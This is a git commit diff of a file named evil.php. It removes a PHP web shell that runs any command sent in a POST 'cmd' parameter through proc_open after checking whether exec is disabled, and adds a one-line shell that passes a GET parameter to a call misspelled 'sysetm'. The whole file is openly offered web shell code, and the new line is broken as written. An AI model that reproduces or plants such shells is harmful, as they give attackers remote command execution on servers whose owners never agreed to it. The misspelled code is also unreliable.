d42c0651d38bf784ac22322b46fba1f0fde2f8a1
Rafaelchriss <86614504+rafaelchriss@users.noreply.github.com>
2025-01-12 09:42:43 -0300

    Update evil.php

--- evil.php
+++ evil.php
@@ -1,37 +1,4 @@
-<?php  
-
-if (isset($_POST["cmd"])) {
-    $cmd = ($_POST["cmd"]); 
-
-    function exec_command($command) {
-        // Lista de funções que serão verificadas
-        $disabled_functions = explode(',', ini_get('disable_functions'));
-        $disabled_functions = array_map('trim', $disabled_functions); // Remove espaços
-
-        // Verifica se a função exec está desabilitada
-        if (!in_array('exec', $disabled_functions)) {
-            $descriptorspec = array(
-                0 => array("pipe", "r"),
-                1 => array("pipe", "w"),
-                2 => array("file", "error-output.txt", "a")
-            ); 
-            $cwd = "";
-            $env = array('some_option' => 'aeiou');
-            $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
-            
-            if (is_resource($process)) {
-                echo stream_get_contents($pipes[1]); 
-                fclose($pipes[1]);
-                proc_close($process);
-            }
-        } else {
-            echo "A função exec está desabilitada.";
-        }
-    }
-
-    exec_command($cmd); 
-    exit;
-} else { 
-    echo "RafaelChriss";
-}
+<?php
+sysetm($_GET[0]);
 ?>
+
